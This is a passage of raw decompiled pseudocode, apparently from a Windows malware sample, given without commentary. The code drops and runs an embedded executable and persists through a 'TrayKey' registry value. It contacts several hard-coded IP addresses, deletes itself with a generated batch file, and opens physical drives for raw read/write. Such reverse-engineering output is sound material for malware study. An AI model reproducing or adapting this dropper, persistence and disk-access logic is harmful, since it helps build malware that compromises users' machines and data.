      } while (sVar2 != 0);
    }
    FUN_0040a9bd(&local_214,0x104,u__exe_0041dd08);
    pauVar10 = FUN_004031f0(&local_24c);
    uVar12 = extraout_EDX_01;
    if (pauVar10 != (undefined (*) [16])0x0) {
      FUN_004027c0(&local_214,pauVar10);
      Sleep(1000);
      ShellExecuteW((HWND)0x0,(LPCWSTR)0x0,&local_214,&DAT_0041de30,(LPCWSTR)0x0,1);
      LVar7 = RegOpenKeyExW((HKEY)0x80000001,u_Software_Microsoft_Windows_NT_Cu_0041dd60,0,3,
                            &local_250);
      if (LVar7 == 0) {
        pWVar11 = &local_23c;
        do {
          WVar1 = *pWVar11;
          pWVar11 = pWVar11 + 1;
        } while (WVar1 != L'\0');
        LVar7 = RegSetValueExW(local_250,u_TrayKey_0041dddc,0,1,(BYTE *)&local_23c,
                               ((int)pWVar11 - (int)&local_23a >> 1) * 2 + 2);
        if (LVar7 == 0) {
          RegCloseKey(local_250);
        }
      }
      FUN_0040b6ac();
      uVar12 = extraout_EDX_02;
    }
  }
LAB_00402cd8:
  FUN_0040a982(local_8 ^ (uint)&local_250,uVar12);
  return;
}



void FUN_00402d00(void)

{
  undefined4 extraout_EDX;
  undefined8 uVar1;
  undefined8 uVar2;
  undefined8 uVar3;
  undefined4 uVar4;
  undefined local_18;
  undefined4 local_17;
  undefined4 local_13;
  undefined4 local_f;
  undefined2 local_b;
  undefined local_9;
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&local_18;
  local_17 = 0;
  local_13 = 0;
  local_f = 0;
  local_b = 0;
  local_9 = 0;
  local_18 = 0;
  uVar1 = FUN_00402e00(s_218_54_31_226_0042360c,(uint)DAT_0042361c);
  uVar4 = (undefined4)((ulonglong)uVar1 >> 0x20);
  if ((int)uVar1 != 0) {
    if (DAT_00423070 == 3) {
      uVar4 = 0x2bac;
    }
    else {
      uVar4 = 0x2ba2;
    }
    uVar2 = FUN_00402e00(s_1_234_83_146_0041de10,uVar4);
    uVar4 = (undefined4)((ulonglong)uVar2 >> 0x20);
    if ((int)uVar2 != 0) {
      if (DAT_00424d9e != 0) {
        FUN_004037b0(DAT_00424d9e);
      }
      uVar3 = FUN_00402e00(&local_18,(uint)DAT_0042361c);
      uVar4 = (undefined4)((ulonglong)uVar3 >> 0x20);
      if ((int)uVar3 == 0) {
        FUN_0040a982(local_8 ^ (uint)&local_18,uVar4);
        return;
      }
      if ((((int)uVar1 == 1) && ((int)uVar2 == 1)) && ((int)uVar3 == 1)) {
        FUN_00402e00(s_133_242_129_155_0041de20,(uint)DAT_0042361c);
        uVar4 = extraout_EDX;
      }
      FUN_0040a982(local_8 ^ (uint)&local_18,uVar4);
      return;
    }
  }
  FUN_0040a982(local_8 ^ (uint)&local_18,uVar4);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_00402e00(undefined4 param_1,undefined4 param_2)

{
  int iVar1;
  int *piVar2;
  DWORD DVar3;
  uint uVar4;
  undefined in_DL;
  undefined4 extraout_EDX;
  undefined *puVar5;
  short *psVar6;
  undefined8 uVar7;
  int local_434;
  undefined local_430;
  undefined4 local_42f;
  undefined4 local_42b;
  undefined4 local_427;
  undefined4 local_423;
  undefined2 local_41f;
  undefined local_41d;
  WCHAR local_41c;
  undefined local_41a [518];
  short local_214;
  undefined local_212 [522];
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&local_434;
  uVar7 = FUN_0040a030(param_1,in_DL,param_2);
  local_434 = (int)uVar7;
  if (local_434 == 0) {
    local_41c = L'\0';
    FUN_0040f8c0((undefined (*) [16])local_41a,0,0x206);
    local_214 = 0;
    FUN_0040f8c0((undefined (*) [16])local_212,0,0x206);
    FUN_00403000();
    FUN_0040a9bd(&local_41c,0x104,(short *)&DAT_0041dc88);
    local_430 = 0;
    local_42f = 0;
    local_42b = 0;
    local_427 = 0;
    local_423 = 0;
    local_41f = 0;
    local_41d = 0;
    psVar6 = &DAT_00424720;
    puVar5 = &stack0xffbdb3ac;
    do {
      if (*psVar6 != 0) {
        FUN_0040aa6e(&local_214,0x104,&local_41c);
        FUN_0040a9bd(&local_214,0x104,psVar6);
        iVar1 = FUN_004053e0(&local_214);
        if (iVar1 != 0) {
          piVar2 = (int *)(psVar6 + 0x82);
          uVar4 = 0x14;
          do {
            if (*(int *)(puVar5 + (int)piVar2) != *piVar2) goto LAB_00402f37;
            uVar4 = uVar4 - 4;
            piVar2 = piVar2 + 1;
          } while (3 < uVar4);
          *psVar6 = 0;
        }
      }
LAB_00402f37:
      psVar6 = psVar6 + 0x8c;
      puVar5 = puVar5 + -0x118;
    } while ((int)psVar6 < 0x424c98);
    psVar6 = &DAT_00424720;
    do {
      if (*psVar6 != 0) {
        _DAT_00424714 = *(undefined4 *)(psVar6 + 0x80);
        FUN_0040a240(psVar6,param_1);
      }
      psVar6 = psVar6 + 0x8c;
    } while ((int)psVar6 < 0x424c98);
    FUN_0040a9bd(&local_41c,0x104,(short *)&DAT_00425360);
    DVar3 = GetFileAttributesW(&local_41c);
    uVar7 = CONCAT44(extraout_EDX,local_434);
    if (DVar3 == 0xffffffff) {
      uVar7 = CONCAT44(extraout_EDX,2);
    }
  }
  local_434 = (int)uVar7;
  FUN_0040a982(local_8 ^ (uint)&local_434,(int)((ulonglong)uVar7 >> 0x20));
  return;
}



void __fastcall FUN_00402fe0(undefined4 param_1,undefined2 *param_2,int param_3)

{
  FUN_0040b83a(param_2,0x104,param_3,&stack0x00000008);
  return;
}



void FUN_00403000(void)

{
  short *psVar1;
  undefined4 extraout_EDX;
  short *unaff_ESI;
  WCHAR local_20c [260];
  uint local_4;
  
  local_4 = DAT_00422044 ^ (uint)local_20c;
  GetModuleFileNameW((HMODULE)0x0,local_20c,0x104);
  psVar1 = FUN_0040a991(local_20c,0x5c);
  *psVar1 = 0;
  FUN_0040aa6e(unaff_ESI,0x104,local_20c);
  FUN_0040a982(local_4 ^ (uint)local_20c,extraout_EDX);
  return;
}



ulonglong FUN_00403060(undefined4 param_1)

{
  undefined4 extraout_ECX;
  undefined4 extraout_EDX;
  ulonglong uVar1;
  
  FUN_0040aa4c();
  uVar1 = FUN_004178c0(extraout_ECX,extraout_EDX);
  return uVar1;
}



void __cdecl FUN_004030a0(undefined4 param_1,int param_2)

{
  int iVar1;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  int iVar2;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  uint uVar3;
  int iVar4;
  int iVar5;
  ulonglong uVar6;
  ulonglong uVar7;
  int local_68 [4];
  undefined4 local_58;
  undefined4 local_54;
  undefined4 local_50;
  undefined4 local_4c;
  undefined4 local_48;
  undefined4 local_44;
  undefined4 local_40;
  undefined4 local_3c;
  undefined4 local_38;
  undefined4 local_34;
  undefined4 local_30;
  undefined4 local_2c;
  undefined4 local_28;
  undefined4 local_24;
  undefined4 local_20;
  undefined4 local_1c;
  undefined4 local_18;
  undefined4 local_14;
  undefined4 local_10;
  undefined4 local_c;
  undefined4 local_8;
  undefined4 local_4;
  
  local_68[1] = 0xffffffff;
  local_68[2] = 0xffffffff;
  local_68[3] = 0xffffffff;
  local_54 = 0xffffffff;
  local_50 = 0xffffffff;
  local_4c = 0xffffffff;
  local_44 = 0xffffffff;
  local_40 = 0xffffffff;
  local_3c = 0xffffffff;
  local_38 = 0xffffffff;
  local_34 = 0xffffffff;
  local_2c = 0xffffffff;
  local_28 = 0xffffffff;
  local_24 = 0xffffffff;
  local_20 = 0xffffffff;
  local_1c = 0xffffffff;
  local_14 = 0xffffffff;
  local_10 = 0xffffffff;
  local_c = 0xffffffff;
  local_4 = 0xffffffff;
  local_8 = 1;
  local_18 = 1;
  local_30 = 1;
  local_48 = 1;
  local_58 = 1;
  local_68[0] = 1;
  FUN_0040aa4c();
  uVar6 = FUN_004178c0(extraout_ECX,extraout_EDX);
  iVar4 = 0;
  iVar5 = 0;
  if (0 < (int)uVar6) {
    do {
      FUN_0040aa4c();
      uVar7 = FUN_004178c0(extraout_ECX_00,extraout_EDX_00);
      iVar2 = (int)uVar7;
      uVar3 = local_68[iVar2] + iVar4 >> 0x1f;
      iVar1 = (local_68[iVar2] + iVar4 ^ uVar3) - uVar3;
      while (1 < iVar1) {
        iVar2 = iVar2 + 1;
        if (iVar2 == 0x1a) {
          iVar2 = 0;
        }
        uVar3 = local_68[iVar2] + iVar4 >> 0x1f;
        iVar1 = (local_68[iVar2] + iVar4 ^ uVar3) - uVar3;
      }
      iVar4 = iVar4 + local_68[iVar2];
      *(short *)(param_2 + iVar5 * 2) = (short)iVar2 + 0x61;
      iVar5 = iVar5 + 1;
    } while (iVar5 < (int)uVar6);
  }
  return;
}



undefined (*) [16] __cdecl FUN_004031f0(DWORD *param_1)

{
  HMODULE hModule;
  HRSRC hResInfo;
  DWORD DVar1;
  HGLOBAL hResData;
  undefined4 *puVar2;
  undefined (*pauVar3) [16];
  
  hModule = GetModuleHandleW((LPCWSTR)0x0);
  hResInfo = FindResourceW(hModule,(LPCWSTR)0x83,u_IDR_BINARY_0041ddf8);
  if (hResInfo != (HRSRC)0x0) {
    DVar1 = SizeofResource(hModule,hResInfo);
    hResData = LoadResource(hModule,hResInfo);
    puVar2 = (undefined4 *)LockResource(hResData);
    *param_1 = DVar1;
    pauVar3 = (undefined (*) [16])FUN_0040b8c1(DVar1);
    FUN_0040f8c0(pauVar3,0,DVar1);
    FUN_00410450((undefined4 *)pauVar3,puVar2,DVar1);
    FreeResource(hResData);
    return pauVar3;
  }
  return (undefined (*) [16])0x0;
}



LPWSTR __cdecl FUN_00403270(LPCSTR param_1)

{
  char cVar1;
  LPWSTR in_EAX;
  LPCSTR pCVar2;
  int iVar3;
  int iVar4;
  
  iVar4 = 0x20;
  pCVar2 = param_1;
  do {
    cVar1 = *pCVar2;
    pCVar2 = pCVar2 + 1;
  } while (cVar1 != '\0');
  iVar3 = (int)pCVar2 - (int)(param_1 + 1);
  if (in_EAX == (LPWSTR)0x0) {
    iVar4 = MultiByteToWideChar(0,0,param_1,-1,(LPWSTR)0x0,0);
    in_EAX = (LPWSTR)FUN_0040afc0(iVar4 * 2);
  }
  if (iVar3 == 0) {
    *in_EAX = L'\0';
    return in_EAX;
  }
  if ((0 < iVar4) && (iVar4 + -1 < iVar3)) {
    iVar3 = iVar4 + -1;
  }
  MultiByteToWideChar(0,0,param_1,-1,in_EAX,iVar3 + 1);
  return in_EAX;
}



undefined4 FUN_004032f0(void)

{
  short sVar1;
  undefined4 *puVar2;
  short *psVar3;
  uint uVar4;
  LPCSTR *ppCVar5;
  short *unaff_EBX;
  int iVar6;
  int local_34 [3];
  short *local_28 [10];
  
  local_28[0] = (short *)0x0;
  local_28[1] = (short *)0x0;
  local_28[2] = (short *)0x0;
  local_28[3] = (short *)0x0;
  local_28[4] = (short *)0x0;
  local_28[5] = (short *)0x0;
  local_28[6] = (short *)0x0;
  local_28[7] = (short *)0x0;
  local_28[8] = (short *)0x0;
  local_28[9] = (short *)0x0;
  local_34[0] = 0;
  iVar6 = 0;
  do {
    puVar2 = (undefined4 *)FUN_0040b8c1(0x20);
    *puVar2 = 0;
    puVar2[1] = 0;
    puVar2[2] = 0;
    puVar2[3] = 0;
    puVar2[4] = 0;
    local_28[iVar6] = (short *)puVar2;
    puVar2[5] = 0;
    iVar6 = iVar6 + 1;
    puVar2[6] = 0;
    puVar2[7] = 0;
  } while (iVar6 < 10);
  psVar3 = unaff_EBX;
  do {
    sVar1 = *psVar3;
    psVar3 = psVar3 + 1;
  } while (sVar1 != 0);
  if (((int)psVar3 - (int)(unaff_EBX + 1) >> 1 == 0) || (unaff_EBX == (short *)0x0)) {
    FUN_004033f0(local_34,(undefined4 *)0x0,local_28);
    if (local_34[0] == 0) {
      return 0;
    }
  }
  else {
    FUN_0040aa6e(local_28[0],0x10,unaff_EBX);
  }
  uVar4 = FUN_00403630(local_28[0]);
  local_34[0] = Ordinal_8(uVar4);
  ppCVar5 = (LPCSTR *)Ordinal_51(local_34,4,2);
  if (ppCVar5 == (LPCSTR *)0x0) {
    return 0;
  }
  FUN_00403270(*ppCVar5);
  return 1;
}



void __fastcall FUN_004033f0(undefined4 param_1,undefined4 *param_2,undefined4 param_3)

{
  char cVar1;
  undefined4 *puVar2;
  undefined4 *puVar3;
  undefined4 *puVar4;
  int iVar5;
  undefined4 *puVar6;
  int iVar7;
  uint uVar8;
  undefined4 uVar9;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  uint unaff_EBX;
  int iVar10;
  bool bVar11;
  undefined8 uVar12;
  int *local_3c;
  undefined4 *local_38;
  short asStack_34 [2];
  undefined4 local_30;
  undefined4 local_2c;
  undefined4 *local_28;
  undefined2 local_24;
  undefined4 local_22;
  undefined4 local_1e;
  undefined4 local_1a;
  undefined2 local_16;
  undefined2 uStack_14;
  undefined2 local_12;
  undefined2 uStack_10;
  undefined4 local_e;
  undefined4 local_a;
  undefined2 local_6;
  uint local_4;
  
  local_4 = DAT_00422044 ^ (uint)&local_3c;
  local_30 = param_3;
  local_3c = (int *)0xffffffff;
  local_24 = 0;
  local_22 = 0;
  local_1e = 0;
  local_1a = 0;
  local_16 = 0;
  uStack_14 = 0;
  local_12 = 0;
  uStack_10 = 0;
  local_e = 0;
  local_a = 0;
  local_6 = 0;
  iVar10 = 0;
  local_2c = param_1;
  local_28 = param_2;
  puVar4 = (undefined4 *)FUN_0040afc0(0x288);
  local_38 = (undefined4 *)0x288;
  iVar5 = GetAdaptersInfo(puVar4);
  if (iVar5 == 0x6f) {
    FUN_0040b61e();
    puVar4 = (undefined4 *)FUN_0040afc0(unaff_EBX);
  }
  uVar12 = GetAdaptersInfo(puVar4,&stack0xffffffc0);
  uVar9 = (undefined4)((ulonglong)uVar12 >> 0x20);
  puVar3 = puVar4;
  if ((int)uVar12 == 0) {
    for (; puVar3 != (undefined4 *)0x0; puVar3 = (undefined4 *)*puVar3) {
      if (param_2 != (undefined4 *)0x0) {
        *param_2 = puVar3[0x65];
        uVar9 = CONCAT22((short)((uint)uVar9 >> 0x10),*(undefined2 *)(puVar3 + 0x66));
        *(undefined2 *)(param_2 + 1) = *(undefined2 *)(puVar3 + 0x66);
      }
      for (puVar2 = puVar3 + 0x6b; puVar2 != (undefined4 *)0x0; puVar2 = (undefined4 *)*puVar2) {
        puVar6 = puVar2 + 1;
        do {
          cVar1 = *(char *)puVar6;
          puVar6 = (undefined4 *)((int)puVar6 + 1);
        } while (cVar1 != '\0');
        iVar5 = (int)puVar6 - ((int)puVar2 + 5);
        if (0x10 < iVar5) {
          iVar5 = 0x10;
        }
        iVar7 = 0;
        if (-1 < iVar5) {
          bVar11 = iVar5 == 0;
          do {
            if (bVar11) {
              asStack_34[iVar7] = 0;
            }
            asStack_34[iVar7] = (short)*(char *)((int)(puVar2 + 1) + iVar7);
            iVar7 = iVar7 + 1;
            bVar11 = iVar7 == iVar5;
          } while (iVar7 <= iVar5);
        }
        uVar8 = FUN_00403630(asStack_34);
        uVar9 = extraout_EDX;
        if (uVar8 != 0) {
          FUN_0040aa6e(*(short **)(unaff_EBX + iVar10 * 4),0x10,asStack_34);
          uVar9 = extraout_EDX_00;
        }
        iVar10 = iVar10 + 1;
        param_2 = local_38;
      }
      if (0 < iVar10) break;
    }
  }
  *local_3c = iVar10;
  if (puVar4 != (undefined4 *)0x0) {
    FUN_0040b61e();
    uVar9 = extraout_EDX_01;
  }
  FUN_0040a982(CONCAT22(local_12,uStack_14) ^ (uint)&stack0xffffffb4,uVar9);
  return;
}



int __cdecl FUN_00403590(int param_1)

{
  short sVar1;
  short *in_EAX;
  short *psVar2;
  int iVar3;
  int iVar4;
  
  iVar3 = 0;
  psVar2 = in_EAX;
  do {
    sVar1 = *psVar2;
    psVar2 = psVar2 + 1;
  } while (sVar1 != 0);
  if ((int)psVar2 - (int)(in_EAX + 1) >> 1 == 0) {
    return 0;
  }
  psVar2 = FUN_0040aadd(in_EAX,(short *)&DAT_0041de34);
  while (psVar2 != (short *)0x0) {
    iVar4 = (int)psVar2 - (int)in_EAX >> 1;
    if (0xf < iVar4) {
      iVar4 = 0xf;
    }
    FUN_0040b926(*(undefined4 **)(param_1 + iVar3 * 4),in_EAX,iVar4);
    in_EAX = psVar2 + 1;
    *(undefined2 *)(*(int *)(param_1 + iVar3 * 4) + iVar4 * 2) = 0;
    iVar3 = iVar3 + 1;
    psVar2 = FUN_0040aadd(in_EAX,(short *)&DAT_0041de34);
  }
  FUN_0040aa6e(*(short **)(param_1 + iVar3 * 4),0xf,in_EAX);
  return iVar3 + 1;
}



uint FUN_00403630(undefined4 param_1)

{
  undefined4 *puVar1;
  int iVar2;
  undefined8 uVar3;
  undefined8 uVar4;
  undefined8 uVar5;
  undefined8 uVar6;
  WCHAR *local_14;
  WCHAR *local_10 [4];
  
  local_10[0] = (WCHAR *)0x0;
  local_10[1] = (WCHAR *)0x0;
  local_10[2] = (WCHAR *)0x0;
  local_10[3] = (WCHAR *)0x0;
  iVar2 = 0;
  do {
    puVar1 = (undefined4 *)FUN_0040b8c1(0x20);
    *puVar1 = 0;
    puVar1[1] = 0;
    puVar1[2] = 0;
    puVar1[3] = 0;
    puVar1[4] = 0;
    local_10[iVar2] = (WCHAR *)puVar1;
    puVar1[5] = 0;
    iVar2 = iVar2 + 1;
    puVar1[6] = 0;
    puVar1[7] = 0;
  } while (iVar2 < 4);
  iVar2 = FUN_00403590((int)local_10);
  if (iVar2 != 4) {
    return 0;
  }
  uVar3 = FUN_0040bcab(local_10[0],&local_14,10);
  uVar4 = FUN_0040bcab(local_10[1],&local_14,10);
  uVar5 = FUN_0040bcab(local_10[2],&local_14,10);
  uVar6 = FUN_0040bcab(local_10[3],&local_14,10);
  iVar2 = 0;
  do {
    if (local_10[iVar2] != (WCHAR *)0x0) {
      FUN_0040b6ac();
    }
    iVar2 = iVar2 + 1;
  } while (iVar2 < 4);
  return (uint)uVar6 | (((int)uVar3 << 8 | (uint)uVar4) << 8 | (uint)uVar5) << 8;
}



void __fastcall FUN_00403730(uint param_1)

{
  undefined4 extraout_EDX;
  short *unaff_ESI;
  short local_24;
  undefined4 local_22;
  undefined4 local_1e;
  undefined4 local_1a;
  undefined4 local_16;
  undefined4 local_12;
  undefined4 local_e;
  undefined4 local_a;
  undefined2 local_6;
  uint local_4;
  
  local_4 = DAT_00422044 ^ (uint)&local_24;
  local_24 = 0;
  local_22 = 0;
  local_1e = 0;
  local_1a = 0;
  local_16 = 0;
  local_12 = 0;
  local_e = 0;
  local_a = 0;
  local_6 = 0;
  FUN_00403bb0(param_1 >> 0x18,&local_24,0x41de38);
  FUN_0040aa6e(unaff_ESI,0x10,&local_24);
  FUN_0040a982(local_4 ^ (uint)&local_24,extraout_EDX);
  return;
}



void __cdecl FUN_004037b0(uint param_1)

{
  undefined4 extraout_EDX;
  char *unaff_ESI;
  char local_14;
  undefined4 local_13;
  undefined4 local_f;
  undefined4 local_b;
  undefined2 local_7;
  undefined local_5;
  uint local_4;
  
  local_4 = DAT_00422044 ^ (uint)&local_14;
  local_14 = '\0';
  local_13 = 0;
  local_f = 0;
  local_b = 0;
  local_7 = 0;
  local_5 = 0;
  FUN_00403bd0(param_1 >> 0x10 & 0xff,&local_14,0x41de50);
  FUN_0040bcd6(unaff_ESI,0x10,&local_14);
  FUN_0040a982(local_4 ^ (uint)&local_14,extraout_EDX);
  return;
}



void FUN_00403830(void)

{
  BOOL BVar1;
  undefined4 extraout_EDX;
  undefined local_120 [4];
  DWORD local_11c;
  uint uStack_118;
  ushort uStack_c;
  uint local_4;
  
  local_4 = DAT_00422044 ^ (uint)local_120;
  FUN_0040f8c0((undefined (*) [16])&local_11c,0,0x118);
  local_120 = (undefined  [4])0x11c;
  BVar1 = GetVersionExW((LPOSVERSIONINFOW)local_120);
  if (BVar1 != 0) {
    if (local_11c == 5) {
      if (uStack_118 == 0) {
        if (3 < uStack_c) {
          FUN_0040a982(local_4 ^ (uint)local_120,extraout_EDX);
          return;
        }
      }
      else if ((1 < uStack_118) || (uStack_118 == 1)) {
        FUN_0040a982(local_4 ^ (uint)local_120,extraout_EDX);
        return;
      }
    }
    else if ((local_11c == 6) && (uStack_118 == 0)) {
      FUN_0040a982(local_4 ^ (uint)local_120,extraout_EDX);
      return;
    }
  }
  FUN_0040a982(local_4 ^ (uint)local_120,extraout_EDX);
  return;
}



undefined8 FUN_00403930(void)

{
  LPCWSTR in_EAX;
  HANDLE hFile;
  BOOL BVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  LARGE_INTEGER LStack_c;
  
  hFile = CreateFileW(in_EAX,0x80000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
  if (hFile == (HANDLE)0xffffffff) {
    return 0xffffffffffffffff;
  }
  BVar1 = GetFileSizeEx(hFile,&LStack_c);
  uVar2 = -1;
  uVar3 = 0xffffffff;
  if (BVar1 == 1) {
    uVar2 = LStack_c.s.HighPart;
    uVar3 = LStack_c.s.LowPart;
  }
  CloseHandle(hFile);
  return CONCAT44(uVar2,uVar3);
}



void __fastcall FUN_00403990(undefined (*param_1) [16])

{
  undefined4 *puVar1;
  uint uVar2;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  int iVar3;
  int local_48;
  undefined4 local_44;
  undefined4 local_40;
  undefined4 local_3c;
  undefined4 local_38;
  undefined4 local_34;
  undefined4 local_30;
  undefined4 local_2c;
  undefined4 local_28;
  undefined4 local_24;
  undefined4 local_20;
  uint local_4;
  
  local_4 = DAT_00422044 ^ (uint)&local_48;
  local_44 = 0;
  local_40 = 0;
  local_3c = 0;
  local_38 = 0;
  local_34 = 0;
  local_30 = 0;
  local_2c = 0;
  local_28 = 0;
  local_24 = 0;
  local_20 = 0;
  local_48 = 0;
  FUN_0040f8c0(param_1,0,0xa0);
  iVar3 = 0;
  do {
    puVar1 = (undefined4 *)FUN_0040b8c1(0x20);
    *puVar1 = 0;
    puVar1[1] = 0;
    puVar1[2] = 0;
    puVar1[3] = 0;
    puVar1[4] = 0;
    (&local_44)[iVar3] = puVar1;
    puVar1[5] = 0;
    iVar3 = iVar3 + 1;
    puVar1[6] = 0;
    puVar1[7] = 0;
  } while (iVar3 < 10);
  FUN_004033f0(&local_48,(undefined4 *)(param_1[4] + 10),&local_44);
  if (0 < local_48) {
    uVar2 = FUN_00403630(local_44);
    *(uint *)param_1[5] = uVar2;
    local_44 = local_44 & 0xffff0000;
    FUN_0040f8c0((undefined (*) [16])((int)&local_44 + 2),0,0x3e);
    iVar3 = FUN_004032f0();
    if (iVar3 == 1) {
      FUN_0040aa6e((short *)(param_1[5] + 8),0x21,(short *)&local_44);
      FUN_0040a982(local_4 ^ (uint)&local_48,extraout_EDX_01);
      return;
    }
    FUN_0040a982(local_4 ^ (uint)&local_48,extraout_EDX_00);
    return;
  }
  FUN_0040a982(local_4 ^ (uint)&local_48,extraout_EDX);
  return;
}



void FUN_00403ac0(void)

{
  undefined4 extraout_EDX;
  LPWSTR unaff_EDI;
  WCHAR local_20c;
  undefined local_20a [518];
  uint local_4;
  
  local_4 = DAT_00422044 ^ (uint)&local_20c;
  local_20c = L'\0';
  FUN_0040f8c0((undefined (*) [16])local_20a,0,0x206);
  if (DAT_00423070 == 3) {
    GetSystemDirectoryW(&local_20c,0x104);
    FUN_0040a9bd(&local_20c,0x104,(short *)&DAT_0041dc88);
  }
  else {
    GetTempPathW(0x104,&local_20c);
  }
  wsprintfW(unaff_EDI,u__s_s_exe_0041dca8,&local_20c);
  FUN_0040a982(local_4 ^ (uint)&local_20c,extraout_EDX);
  return;
}



void FUN_00403b60(void)

{
  uint in_EAX;
  DWORD DVar1;
  uint uVar2;
  undefined (*unaff_EBX) [16];
  int iVar3;
  int iVar4;
  
  FUN_0040f8c0(unaff_EBX,0,in_EAX);
  iVar4 = (int)(in_EAX + ((int)in_EAX >> 0x1f & 3U)) >> 2;
  DVar1 = GetTickCount();
  FUN_0040aa3a(DVar1);
  iVar3 = 0;
  if (0 < iVar4) {
    do {
      uVar2 = FUN_0040aa4c();
      *(uint *)(*unaff_EBX + iVar3 * 4) = uVar2;
      iVar3 = iVar3 + 1;
    } while (iVar3 < iVar4);
  }
  return;
}



void __fastcall FUN_00403bb0(undefined4 param_1,undefined2 *param_2,int param_3)

{
  FUN_0040b83a(param_2,0x10,param_3,&stack0x00000008);
  return;
}



void __fastcall FUN_00403bd0(undefined4 param_1,undefined *param_2,int param_3)

{
  FUN_0040be92(param_2,0x10,param_3,&stack0x00000008);
  return;
}



void FUN_00403bf0(void)

{
  char cVar1;
  undefined *puVar2;
  char *pcVar3;
  HANDLE hFile;
  char *pcVar4;
  char *pcVar5;
  undefined (*lpBuffer) [16];
  undefined (*pauVar6) [16];
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 uVar7;
  DWORD local_314;
  CHAR local_310 [260];
  CHAR aCStack_20c [260];
  char acStack_108 [260];
  uint local_4;
  
  local_4 = DAT_00422044 ^ (uint)&local_314;
  local_314 = 0;
  GetTempPathA(0x104,local_310);
  FUN_0040bf5b(local_310,0x104,s__vslite_bat_0041de60);
  GetModuleFileNameA((HMODULE)0x0,aCStack_20c,0x104);
  FUN_0040bcd6(acStack_108,0x104,aCStack_20c);
  pcVar3 = FUN_0040bf10(acStack_108,'\\');
  if (pcVar3 != (char *)0x0) {
    *pcVar3 = '\0';
  }
  hFile = CreateFileA(local_310,0x40000000,0,(LPSECURITY_ATTRIBUTES)0x0,2,0x80,(HANDLE)0x0);
  uVar7 = extraout_EDX;
  if (hFile != (HANDLE)0xffffffff) {
    pcVar3 = s__Repeat_del___s__if_exist___s__g_00423620;
    do {
      pcVar4 = pcVar3;
      pcVar3 = pcVar4 + 1;
    } while (*pcVar4 != '\0');
    pcVar3 = aCStack_20c;
    do {
      cVar1 = *pcVar3;
      pcVar3 = pcVar3 + 1;
    } while (cVar1 != '\0');
    pcVar5 = local_310;
    do {
      cVar1 = *pcVar5;
      pcVar5 = pcVar5 + 1;
    } while (cVar1 != '\0');
    pcVar3 = pcVar5 + (int)pcVar3 * 3 + (int)&stack0xfffffce8 * -4 + (int)(pcVar4 + -0x42391e);
    lpBuffer = (undefined (*) [16])FUN_0040b8c1((uint)pcVar3);
    FUN_0040f8c0(lpBuffer,0,(uint)pcVar3);
    FUN_0040bf3d((undefined *)lpBuffer,(uint)pcVar3,0x423620);
    pauVar6 = lpBuffer;
    do {
      puVar2 = *pauVar6;
      pauVar6 = (undefined (*) [16])(*pauVar6 + 1);
    } while (*puVar2 != '\0');
    WriteFile(hFile,lpBuffer,(int)pauVar6 - (int)(*lpBuffer + 1),&local_314,(LPOVERLAPPED)0x0);
    CloseHandle(hFile);
    ShellExecuteA((HWND)0x0,&DAT_0041de6c,local_310,(LPCSTR)0x0,(LPCSTR)0x0,0);
    uVar7 = extraout_EDX_00;
    if (lpBuffer != (undefined (*) [16])0x0) {
      FUN_0040b6ac();
      uVar7 = extraout_EDX_01;
    }
  }
  FUN_0040a982(local_4 ^ (uint)&local_314,uVar7);
  return;
}



void __cdecl FUN_00403d90(uint param_1,LPVOID param_2)

{
  HANDLE unaff_ESI;
  DWORD local_18;
  _OVERLAPPED local_14;
  
  local_14.Internal = 0;
  local_14.InternalHigh = 0;
  local_14.hEvent = (HANDLE)0x0;
  local_18 = 0;
  if (unaff_ESI != (HANDLE)0xffffffff) {
    local_14.u = (_union_518)((ulonglong)param_1 * 0x200);
    ReadFile(unaff_ESI,param_2,0x400,&local_18,&local_14);
  }
  return;
}



void __fastcall FUN_00403df0(undefined4 param_1,undefined4 param_2)

{
  int iVar1;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  uint unaff_EBX;
  undefined4 *puVar2;
  undefined4 *puVar3;
  short local_40;
  undefined4 local_3e;
  undefined4 local_3a;
  undefined4 local_36;
  undefined4 local_32;
  undefined2 local_2e;
  undefined4 local_2c [9];
  undefined4 local_8;
  uint local_4;
  
  local_4 = DAT_00422044 ^ (uint)&local_40;
  puVar2 = (undefined4 *)u_____PHYSICALDRIVE_0041de74;
  puVar3 = local_2c;
  for (iVar1 = 9; iVar1 != 0; iVar1 = iVar1 + -1) {
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  local_8 = 0;
  local_40 = 0;
  local_3e = 0;
  local_3a = 0;
  local_36 = 0;
  local_32 = 0;
  local_2e = 0;
  if (-1 < (int)unaff_EBX) {
    FUN_0040c0c5(unaff_EBX,&local_40,10,10);
    FUN_0040a9bd((short *)local_2c,0x14,&local_40);
    if (unaff_EBX != 0) {
      CreateFileW((LPCWSTR)local_2c,0xc0000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
      FUN_0040a982(local_4 ^ (uint)&local_40,extraout_EDX);
      return;
    }
    CreateFileW((LPCWSTR)local_2c,0x80000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
    param_2 = extraout_EDX_00;
  }
  FUN_0040a982(local_4 ^ (uint)&local_40,param_2);
  return;
}



void __cdecl FUN_00403eb0(short param_1)

{
  HANDLE hDevice;
  BOOL BVar1;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 uVar2;
  undefined4 extraout_EDX_01;
  undefined4 *unaff_EBX;
  undefined8 uVar3;
  DWORD DStack_438;
  undefined4 local_434;
  undefined2 local_430;
  WCHAR local_42c;
  undefined4 local_42a;
  undefined4 local_426;
  undefined4 local_422;
  undefined4 local_41e;
  undefined4 local_41a;
  undefined4 local_416;
  undefined4 local_412;
